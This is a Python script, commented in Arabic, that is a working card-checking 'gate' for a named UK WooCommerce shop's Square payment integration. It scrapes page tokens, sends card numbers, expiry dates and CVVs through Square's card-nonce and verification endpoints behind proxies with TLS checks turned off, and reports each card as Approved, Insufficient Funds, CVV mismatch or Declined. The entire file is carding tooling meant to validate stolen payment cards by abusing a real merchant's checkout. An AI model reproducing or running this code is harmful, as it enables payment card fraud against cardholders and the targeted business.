"""
بوابة الدفع: Square Auth SQ-1
الموقع: kebabskee.co.uk
نوع البوابة: Square Auth (WooCommerce Square)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج nonce و applicationId و locationId
2. GET https://pci-connect.squareup.com/payments/hydrate -> الحصول على sessionId و instanceId
3. POST https://pci-connect.squareup.com/v2/card-nonce -> الحصول على card_nonce
4. POST https://pci-connect.squareup.com/v2/analytics/verifications -> الحصول على verification_token
5. POST /my-account/add-payment-method/ -> النتيجة النهائية
"""
import aiohttp
import asyncio
import hashlib
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_page_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str]:
    """الخطوة 1: جلب nonce و applicationId و locationId."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    try:
        async with session.get(
            "https://kebabskee.co.uk/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', text)
        app_id_match = re.search(r'"applicationId":"([^"]+)"', text)
        loc_id_match = re.search(r'"locationId":"([^"]+)"', text)

        nonce = nonce_match.group(1) if nonce_match else ""
        app_id = app_id_match.group(1) if app_id_match else ""
        loc_id = loc_id_match.group(1) if loc_id_match else ""
        return nonce, app_id, loc_id
    except Exception as e:
        raise RuntimeError(f"req1_get_page_tokens failed: {e}") from e


async def req2_hydrate(
    session: aiohttp.ClientSession,
    app_id: str,
    loc_id: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 2: الحصول على sessionId و instanceId من Square."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    url = f"https://pci-connect.squareup.com/payments/hydrate?applicationId={app_id}&locationId={loc_id}"
    try:
        async with session.get(url, headers=headers, proxy=proxy_url) as r:
            data = await r.json(content_type=None)

        return data.get("sessionId", ""), data.get("instanceId", "")
    except Exception as e:
        raise RuntimeError(f"req2_hydrate failed: {e}") from e


async def req3_get_card_nonce(
    session: aiohttp.ClientSession,
    app_id: str,
    session_id: str,
    instance_id: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: الحصول على card_nonce من Square PCI."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    pow_token = hashlib.sha256(f"{session_id}{instance_id}".encode()).hexdigest()
    card_data = {
        "application_id": app_id,
        "card_data": {
            "billing_postal_code": "SW1A 1AA",
            "cvv": cvv,
            "exp_month": int(mes),
            "exp_year": int(ano),
            "number": cc,
        },
        "session_id": session_id,
        "instance_id": instance_id,
        "pow": pow_token,
    }
    try:
        async with session.post(
            "https://pci-connect.squareup.com/v2/card-nonce",
            json=card_data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        return res.get("card_nonce", "")
    except Exception as e:
        raise RuntimeError(f"req3_get_card_nonce failed: {e}") from e


async def req4_verify_nonce(
    session: aiohttp.ClientSession,
    cnon: str,
    app_id: str,
    loc_id: str,
    session_id: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 4: الحصول على verification_token."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    data = {
        "nonce": cnon,
        "application_id": app_id,
        "location_id": loc_id,
        "session_id": session_id,
    }
    try:
        async with session.post(
            "https://pci-connect.squareup.com/v2/analytics/verifications",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        return res.get("verification_token", "")
    except Exception as e:
        raise RuntimeError(f"req4_verify_nonce failed: {e}") from e


async def req5_submit_payment(
    session: aiohttp.ClientSession,
    cnon: str,
    verf: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 5: إرسال وسيلة الدفع النهائية."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    payload = {
        "payment_method": "square_credit_card",
        "square_credit_card_card_nonce": cnon,
        "square_credit_card_tokenization_nonce": verf,
        "_wpnonce": nonce,
        "woocommerce_add_payment_method_card": "1",
    }
    try:
        async with session.post(
            "https://kebabskee.co.uk/my-account/add-payment-method/",
            data=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req5_submit_payment failed: {e}") from e


async def process_SQ_1(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Square Auth SQ-1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("SQ-1-Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            nonce, app_id, loc_id = await req1_get_page_tokens(session, proxy_url)
            session_id, instance_id = await req2_hydrate(session, app_id, loc_id, proxy_url)
            cnon = await req3_get_card_nonce(session, app_id, session_id, instance_id, cc, mes, ano, cvv, proxy_url)
            verf = await req4_verify_nonce(session, cnon, app_id, loc_id, session_id, proxy_url)
            final_text = await req5_submit_payment(session, cnon, verf, nonce, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "Payment method successfully added" in final_text or "Status: Approved" in final_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "Insufficient Funds" in final_text or "insufficient_funds" in final_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "Security code is incorrect" in final_text or "cvv_failure" in final_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN Matched (Wrong CVV)"
    elif "Card declined" in final_text or "GENERIC_DECLINE" in final_text:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        error_match = re.search(r'class="woocommerce-error"><li>(.*?)</li>', final_text)
        msg = error_match.group(1) if error_match else "Unknown Error"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", msg
